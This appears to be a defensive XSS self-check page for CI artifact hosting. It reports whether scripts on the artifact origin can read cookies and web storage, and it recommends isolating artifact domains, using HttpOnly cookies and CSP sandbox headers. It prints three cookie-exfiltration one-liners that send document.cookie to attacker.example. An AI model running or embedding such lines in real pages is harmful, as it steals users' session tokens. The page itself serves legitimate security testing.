CI Artifact Hosting — XSS Exposure Self-Check

Upload this file as a build/CI artifact and open the hosted copy. It checks, from inside the page itself, what a malicious script embedded in an uploaded HTML artifact could actually reach on this origin — without sending anything anywhere. Nothing here exfiltrates data; it only reports locally what would be readable if it did.

Page origin —

This is the origin the browser enforces same-origin policy against.

  


  

    
document.cookie access —

    

    

      If a cookie-based session token is readable here (i.e. it is not marked
      HttpOnly) and this artifact domain shares a cookie scope with the real
      application, a script in an uploaded HTML file could read it and send it to an
      attacker-controlled server with a single fetch() call.
    

  


  

    
localStorage / sessionStorage access —

    

    

      Tokens stored here (common for SPA auth tokens, feature flags, etc.) are always readable
      by any script running on the same origin — storage has no "HttpOnly" equivalent.

      This shows the exact one-liner an attacker would use — it is not executed

fetch('https://attacker.example/collect?c=' + encodeURIComponent(document.cookie));
new Image().src = 'https://attacker.example/pixel.gif?c=' + encodeURIComponent(document.cookie);
navigator.sendBeacon('https://attacker.example/beacon', document.cookie);

    
    

  


  

    
Overall assessment —

    

  


  

    Self-contained proof-of-concept. No data in this page is ever sent off-device; every
    panel above only reads values already accessible to any script on this origin and prints
    them to the DOM. Remove this artifact after testing. Mitigations: serve build artifacts
    from an isolated, cookieless domain (e.g. a dedicated *-artifacts.example.com
    or sandboxed githubusercontent.com-style domain), set HttpOnly +
    SameSite on session cookies, and send
    Content-Security-Policy: sandbox headers on artifact responses.
